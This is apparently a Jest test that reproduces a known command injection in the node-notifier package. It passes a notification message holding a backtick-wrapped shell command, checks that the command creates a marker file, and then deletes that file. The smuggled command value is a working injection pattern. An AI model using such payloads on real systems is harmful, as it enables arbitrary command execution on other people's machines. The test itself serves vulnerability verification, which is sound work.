// https://snyk.io/vuln/SNYK-JS-NODENOTIFIER-1035794
test("Command Injection in node-notifier", () => {
	const Notify = require("node-notifier").NotifySend;
    let notifier = new Notify({ suppressOsdCheck: true });
    let options = JSON.parse('{"title":"Foo", "message":["`touch node-notifier & echo 23`"]}');

    const fs = require('fs')
	const path = './node-notifier'
	const sleep = require('sleep');
	
	// checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    notifier.notify(options);
	
	sleep.sleep(2);
	// checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});// deleting the file after creation

});